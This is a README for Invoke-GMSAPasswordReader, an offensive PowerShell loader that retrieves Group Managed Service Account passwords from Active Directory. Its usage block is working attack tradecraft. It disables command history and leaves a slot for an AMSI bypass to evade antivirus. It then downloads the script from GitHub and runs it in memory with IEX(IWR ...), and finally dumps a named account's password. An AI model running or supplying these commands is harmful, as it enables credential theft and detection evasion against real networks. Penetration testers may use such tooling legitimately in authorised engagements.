# Invoke-GMSAPasswordReader

## The .Net assembly is based on my modified fork GMSAPasswordReader: https://github.com/ricardojba/GMSAPasswordReader.

[PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) style .Net Assembly loader for the [GMSAPasswordReader](https://github.com/ricardojba/GMSAPasswordReader).

Usage:

```
Set-PSReadlineOption -HistorySaveStyle SaveNothing

<Insert-Your-AMSI-Bypass-From-AMSI.FAIL-Here>

[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
# [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

[system.net.webrequest]::defaultwebproxy = new-object system.net.webproxy('http://proxy:8080')
[system.net.webrequest]::defaultwebproxy.BypassProxyOnLocal = $true
[system.net.webrequest]::defaultwebproxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# [system.net.webrequest]::defaultwebproxy.credentials = Get-Credential

IEX(IWR -UseBasicParsing -UserAgent "hi-there-blueteam" 'https://raw.githubusercontent.com/ricardojba/Invoke-noPac/main/Invoke-GMSAPasswordReader.ps1')

Invoke-GMSAPasswordReader -Command "--AccountName jkohler"
```

## Credits

[rvazarkar] for the original [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader).
